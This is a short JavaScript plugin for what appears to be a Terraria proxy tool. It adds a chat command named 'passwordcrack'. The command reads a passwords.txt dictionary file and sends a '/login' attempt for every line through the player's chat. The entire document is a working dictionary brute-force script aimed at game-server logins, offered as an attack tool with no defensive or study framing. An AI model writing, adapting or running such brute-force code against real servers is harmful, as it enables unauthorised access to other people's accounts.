
var command_name = "passwordcrack";
var command_description = "Attempt to crack the current users password";

var File = Java.type("java.io.File");
var Color = Java.type("me.tyler.terraria.TerrariaColor");
var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");

function packet_type(){
}

function get_file(){
	return new File("passwords.txt");
}

function chat_command(proxy, command, args){
	
	if(command.equalsIgnoreCase(command_name)){
		
		file = get_file();
		
		if(!file.exists()){
			proxy.getThePlayer().sendMessage(Color.RED, "The password dictionary file could not be found! ("+file.getPath());
		}else{
			
			var br = null;
			
			try{
				br = new BufferedReader(new FileReader(file));
				
				while((line = br.readLine()) != null){
					proxy.getThePlayer().chat("/login "+line);
				}
				
			}catch(e){
				proxy.getThePlayer().sendMessage(Color.RED, "ERROR: "+e.getMessage());
			}finally{
				if(br != null){
					br.close();
				}
			}
			
		}
		
		return true;
		
	}
	
}